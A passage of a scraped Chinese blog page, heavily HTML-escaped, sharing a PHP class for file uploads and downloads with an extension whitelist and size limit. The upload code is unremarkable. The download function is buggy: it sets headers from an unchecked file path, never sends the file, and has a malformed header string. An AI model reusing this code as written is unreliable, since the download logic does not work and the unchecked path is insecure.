nputs%20as%20%24inp)%7B%0A%09%09%09%09if(!empty(%24files%5B%24inp%5D))%7B%09%0A%09%09%09%09%09%24this-%3Etoup(%24files%5B%24inp%5D)%3B%0A%09%09%09%09%7D%0A%09%09%09%7D%09%0A%09%09%7Delse%7B%0A%09%09%09echo%20%22%E6%B2%92%E6%9C%89%E6%96%87%E4%BB%B6%E8%A6%81%E4%B8%8A%E5%82%B3%22.%22%3Cbr%3E%22%3B%0A%09%09%7D%0A%09%7D%0A%09%2F**%0A%09%20*%20%E5%A4%84%E7%90%86%E4%B8%8D%E5%90%8C%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E4%B8%8A%E4%BC%A0%3B%0A%09%20*%20%40param%20array%20%24tmp%0A%09%20*%2F%0A%09private%20function%20toup(%24tmp)%7B%0A%09%09%24cout%09%3D%09count(%24tmp%5B''name''%5D)%3B%0A%09%09if(%24cout%3E1)%7B%09%2F%2F%E5%A4%9A%E5%80%8B%E6%96%87%E4%BB%B6%3B%0A%09%09%09for(%24i%3D0%3B%24i%3C%24cout%3B%24i%2B%2B)%7B%0A%09%09%09%09%24name%09%3D%09%24tmp%5B''name''%5D%5B%24i%5D%3B%0A%09%09%09%09%24err%09%3D%09%24tmp%5B''error''%5D%5B%24i%5D%3B%0A%09%09%09%09%24size%09%3D%09%24tmp%5B''size''%5D%5B%24i%5D%3B%0A%09%09%09%09%24tmp_name%09%3D%09%24tmp%5B''tmp_name''%5D%5B%24i%5D%3B%0A%09%09%09%09%24this-%3Eup(%24name%2C%24err%2C%24size%2C%24tmp_name)%3B%09%2F%2F%E5%88%A4%E6%96%AD%EF%BC%8C%E5%B9%B6%E4%B8%8A%E4%BC%A0%3B%0A%09%09%09%7D%0A%09%09%7Delse%7B%0A%09%09%09%24name%09%3D%09%24tmp%5B''name''%5D%3B%0A%09%09%09%24err%09%3D%09%24tmp%5B''error''%5D%3B%0A%09%09%09%24size%09%3D%09%24tmp%5B''size''%5D%3B%0A%09%09%09%24tmp_name%09%3D%09%24tmp%5B''tmp_name''%5D%3B%0A%09%09%09%24this-%3Eup(%24name%2C%24err%2C%24size%2C%24tmp_name)%3B%09%2F%2F%E5%88%A4%E6%96%AD%EF%BC%8C%E5%B9%B6%E4%B8%8A%E4%BC%A0%3B%0A%09%09%7D%0A%09%7D%0A%09%2F**%0A%09%20*%20%E7%9C%9F%E6%AD%A3%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95%3B%0A%09%20*%20%40param%20string%20%24name%0A%09%20*%20%40param%20string%20%24err%0A%09%20*%20%40param%20int%20%24size%0A%09%20*%20%40param%20string%20%24tmp_name%0A%09%20*%2F%0A%09private%20function%20up(%24name%2C%24err%2C%24size%2C%24tmp_name)%7B%0A%09%09%24msg%09%3D%09%24this-%3Emsg(%24err)%3B%0A%09%09if(%24msg!%3D%22success%22)%7B%0A%09%09%09echo%20%24name.%22%20%22.%24msg.%22%3Cbr%3E%22%3B%0A%09%09%09return%20%3B%0A%09%09%7D%0A%09%09%24name_str%09%3D%09%22%3Cfont%20color%3D''red''%3E%22.%24name.%22%3C%2Ffont%3E%22%3B%0A%09%09%24boo%09%3D%09%24this-%3Eis_allow(''type''%2C%24name)%3B%0A%09%09if(%24boo%3D%3Dtrue)%7B%09%2F%2F%E5%88%A4%E6%96%AD%E7%B1%BB%E5%9E%8B%3B%0A%09%09%09%24tt%09%09%3D%09%24this-%3Eis_allow(''size''%2C%24size)%3B%0A%09%09%09if(%24tt)%7B%09%2F%2F%E5%88%A4%E6%96%AD%E5%A4%A7%E5%B0%8F%3B%0A%09%09%09%09if(is_uploaded_file(%24tmp_name))%7B%0A%09%09%09%09%09%24ext%09%3D%09explode(''.''%2C%24name)%3B%09%0A%09%09%09%09%09%24ext%09%3D%09%24ext%5Bcount(%24ext)-1%5D%3B%0A%09%09%09%09%09%24filepath%09%3D%09%24this-%3Emoveto%3B%0A%09%09%09%09%09if(!is_dir(%24filepath))%7B%09%2F%2F%E5%A6%82%E6%9E%9C%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%8D%E5%AD%98%E5%9C%A8%EF%BC%8C%E5%88%99%E8%87%AA%E5%8A%A8%E5%88%9B%E5%BB%BA%3B%0A%09%09%09%09%09%09mkdir(%24filepath)%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09if(%24this-%3Erand)%7B%09%2F%2F%E6%98%AF%E5%90%A6%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%96%87%E4%BB%B6%E5%90%8D%3B%0A%09%09%09%09%09%09%24randname%09%3D%09date(''YmdHis'').rand(100%2C999).%22.%22.%24ext%3B%0A%09%09%09%09%09%7Delse%7B%0A%09%09%09%09%09%09%24randname%09%3D%09iconv(''gb2312''%2C''utf-8''%2C%24name)%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09if(move_uploaded_file(%24tmp_name%2C%20%24filepath.%22%2F%22.%24randname))%7B%0A%09%09%09%09%09%09echo%20%22%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%9A%22.%24name_str.%22%3Cbr%3E%22%3B%0A%09%09%09%09%09%09echo%20%22%E5%A4%A7%E3%80%80%E5%B0%8F%EF%BC%9A%22.%24this-%3Etosize(%24size).%22%3Cbr%3E%22%3B%0A%09%09%09%09%09%09echo%20%22%E7%B1%BB%E3%80%80%E5%9E%8B%EF%BC%9A%22.%24ext.%22%3Cbr%3E%22%3B%0A%09%09%09%09%09%09echo%20%22%E7%8A%B6%E3%80%80%E6%80%81%EF%BC%9A%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%22.%22%3Cbr%3E%3Cbr%3E%22%3B%0A%09%09%09%09%09%7Delse%7B%0A%09%09%09%09%09%09echo%20%24name_str.%22%20%E4%B8%8A%E4%BC%A0%E5%A4%B1%E8%B4%A5%22.%22%3Cbr%3E%22%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%7Delse%7B%0A%09%09%09%09%09echo%20%24name_str.%22%20%E4%B8%8D%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%22.%22%3Cbr%3E%22%3B%0A%09%09%09%09%7D%0A%09%09%09%7Delse%7B%0A%09%09%09%09echo%20%24name_str.%22%20%E6%96%87%E4%BB%B6%E5%A4%AA%E5%A4%A7%EF%BC%8C%E4%B8%8D%E8%83%BD%E4%B8%8A%E4%BC%A0%22.%22%3Cbr%3E%22%3B%0A%09%09%09%7D%0A%09%09%7Delse%7B%0A%09%09%09echo%20%24name_str.%22%20%E8%BF%99%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8D%E5%85%81%E8%AE%B8%E4%B8%8A%E4%BC%A0%22.%22%3Cbr%3E%22%3B%0A%09%09%7D%0A%09%7D%0A%09%0A%09%0A%09%2F**%0A%09%20*%20%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%BB%A1%E8%B6%B3%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%9D%A1%E4%BB%B6%3B%0A%09%20*%20%40param%20%24type%20%E7%B1%BB%E5%9E%8B%20%0A%09%20*%20%40param%20%24vals%20%E5%80%BC%0A%09%20*%2F%0A%09private%20function%20is_allow(%24type%2C%24vals)%7B%0A%09%09%24boo%09%3D%09false%3B%0A%09%09if(%24type%3D%3D%22type%22)%7B%09%09%2F%2F%E5%88%A4%E6%96%B7%E9%A1%9E%E5%9E%8B%3B%0A%09%09%09%24ext%09%3D%09explode(''.''%2C%24vals)%3B%09%0A%09%09%09%24ext%09%3D%09strtolower(%24ext%5Bcount(%24ext)-1%5D)%3B%0A%09%09%09if(in_array(%24ext%2C%24this-%3Eallow_type))%7B%0A%09%09%09%09%24boo%09%3D%09true%3B%0A%09%09%09%7D%0A%09%09%7Delse%20if(%24type%3D%3D%22size%22)%7B%2F%2F%E5%88%A4%E6%96%B7%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%3B%0A%09%09%09if(%24vals%3C%3D%24this-%3Emaxsize)%7B%0A%09%09%09%09%24boo%09%3D%09true%3B%0A%09%09%09%7D%0A%09%09%7D%0A%09%09return%20%24boo%3B%0A%09%7D%0A%09%0A%09%2F**%0A%09%20*%20%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%3B%0A%09%20*%2F%0A%09function%20down(%24file)%7B%0A%09%09header(''Content-type%3A''.filetype(%24file))%3B%0A%09%09header(''Content-Disposition%3A%20attachment%3B%20filename%3D%22''.%24file.''%22'')%3B%0A%09%09header(%22''Content-length%3A%22.filesize(%24file))%3B%0A%09%7D%0A%7D&quot; quality=&quot;high&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;&amp;nbsp;&lt;a href=&quot;http://lansexin313.iteye.com/blog/986075&quot; title=&quot;收藏这段代码&quot; style=&quot;color:#108ac6;text-decoration:underline;&quot;&gt;&lt;img class=&quot;star&quot; src=&quot;http://lansexin313.iteye.com/images/icon_star.png&quot; alt=&quot;收藏代码&quot; style=&quot;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;&quot; /&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;ol start=&quot;1&quot; class=&quot;dp-c&quot; style=&quot;font-size:1em;line-height:1.4em;margin-top:0px;margin-right:0px;margin-bottom:1px;margin-left:0px;padding-top:2px;padding-right:0px;padding-bottom:2px;padding-left:0px;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-color:#d1d7dc;border-right-color:#d1d7dc;border-bottom-color:#d1d7dc;border-left-color:#d1d7dc;list-style-type:decimal;list-style-position:initial;list-style-image:initial;background-color:#ffffff;color:#2b91af;&quot;&gt;&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;lt;?php&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;/**&lt;/span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;&amp;nbsp;*&amp;nbsp;文件的操作类;&lt;/span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;&amp;nbsp;*&amp;nbsp;@author&amp;nbsp;lansexin&lt;/span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;&amp;nbsp;*/&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;class&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;File&amp;nbsp;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;var&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$allow_type&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//允许的上传文件类型;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;var&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$moveto&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//上传文件的地址;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;var&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$maxsize&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//文件的最大大小;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;var&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$rand&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//是否随机产生文件名&amp;nbsp;;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;__construct(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;empty&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$type&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;=&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;explode&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;'',''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''type''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;]);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;-&amp;gt;allow_type&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;=&amp;nbsp;&amp;nbsp;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;is_array&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$type&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''type''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;])?&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$type&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;array&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''txt''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''gif''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''png''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''jpg''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//默认的类型;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;-&amp;gt;moveto&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;=&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''moveto''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;];&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//上传的目录;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;-&amp;gt;maxsize&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;=&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''size''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;]?&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$arr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''size''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;]:(1024*1024*2);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//上传的大小限制;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span 